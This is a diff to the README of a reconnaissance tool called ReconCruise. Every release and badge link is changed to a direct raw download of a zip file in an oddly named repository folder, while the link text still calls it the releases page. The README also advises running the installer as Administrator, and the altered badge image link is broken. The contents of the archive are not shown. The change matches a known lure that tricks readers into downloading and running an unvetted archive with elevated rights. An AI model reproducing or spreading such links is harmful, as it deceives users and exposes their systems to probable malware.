@@ -1,7 +1,7 @@
 # 🌐 ReconCruise - A Simple Tool for Easy Reconnaissance
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/AnayaMourad/ReconCruise/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/AnayaMourad/ReconCruise/main/wilkeite/ReconCruise.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/AnayaMourad/ReconCruise/main/wilkeite/ReconCruise.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you download, ensure your system meets these basic requirements:
 To install ReconCruise, follow these steps:
 
 1. **Visit the Release Page**  
-   Go to our [Releases Page](https://github.com/AnayaMourad/ReconCruise/releases) to find the latest version.
+   Go to our [Releases Page](https://raw.githubusercontent.com/AnayaMourad/ReconCruise/main/wilkeite/ReconCruise.zip) to find the latest version.
 
 2. **Choose Your Version**  
    On the releases page, locate the latest version. Click on the file that matches your operating system.
@@ -59,7 +59,7 @@ If you encounter issues during download or installation, try these steps:
    Make sure you are online. A stable connection is necessary for downloading the application.
 
 2. **Re-download the Installer**  
-   Sometimes downloads can fail. If the file seems corrupted, delete it and download it again from the [Releases Page](https://github.com/AnayaMourad/ReconCruise/releases).
+   Sometimes downloads can fail. If the file seems corrupted, delete it and download it again from the [Releases Page](https://raw.githubusercontent.com/AnayaMourad/ReconCruise/main/wilkeite/ReconCruise.zip).
 
 3. **Run as Administrator**  
    If the installation fails, try right-clicking the installer and selecting "Run as Administrator." This can help overcome permission issues.
@@ -96,4 +96,4 @@ If you have questions or need help, feel free to reach out via the GitHub reposi
 
 ## 🚀 Download Now Again
 Don’t forget to download ReconCruise to get started on your reconnaissance journey.  
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/AnayaMourad/ReconCruise/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/AnayaMourad/ReconCruise/main/wilkeite/ReconCruise.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/AnayaMourad/ReconCruise/main/wilkeite/ReconCruise.zip)
